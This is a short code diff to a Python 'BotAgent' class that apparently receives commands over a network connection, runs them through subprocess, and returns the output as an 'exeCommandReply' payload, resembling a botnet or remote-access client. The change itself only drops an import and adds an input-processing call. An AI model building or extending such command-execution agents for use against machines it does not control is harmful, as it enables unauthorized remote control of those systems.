@@ -1,5 +1,4 @@
 import os
-import platform
 import uuid
 import shlex
 from subprocess import Popen, PIPE
@@ -192,6 +191,7 @@ class BotAgent:
                       format(self.hostname, err))
                 self.__self_identify()
             if data:
+                self.__process_input_stream(data)
                 response = self.__execute_command(data.decode("utf-8"))
                 if response:
                     payload = self.__build_json_payload("exeCommandReply", optional=(data.decode("utf-8"),
